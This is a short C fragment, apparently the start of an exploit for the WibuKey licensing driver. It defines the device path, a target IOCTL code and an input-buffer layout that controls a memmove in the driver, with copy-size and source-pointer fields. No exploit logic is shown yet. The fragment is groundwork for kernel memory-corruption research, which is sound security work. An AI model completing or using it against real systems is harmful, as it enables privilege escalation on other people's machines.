#include <Windows.h>
#include <stdio.h>

#define WIBUKEY_DEVICE "\\\\.\\GLOBALROOT\\Device\\WibuKey"
#define TARGET_IOCTL 0x8200E804

int main(int argc, char** argv);

typedef struct _MEMMOVE_INPUT_BUFFER
{
	unsigned long Padding1;					// Offset: +0x0 from base; add +0x4 to base
	unsigned short OutputBufferLength;		// Offset: +0x4 from base; add +0x2 to base

	// THESE NEED TO BE TESTED!
	unsigned char JumpTableCode;			// Offset: +0x6 (6)
	unsigned char Padding2;					// Offset: +0x7 (7)
	unsigned int Padding3;					// Offset: +0x8 (8)
	unsigned int Padding4;					// Offset: +0xC (12)
	unsigned int MemmoveCopySize;			// Offset: +0x10 (16)
	unsigned int ComparedMemmoveCopySize;	// Offset: +0x14 (20)
	void* Source;							// Offset: +0x18 (24)
} MEMMOVE_INPUT_BUFFER, *PMEMMOVE_INPUT_BUFFER;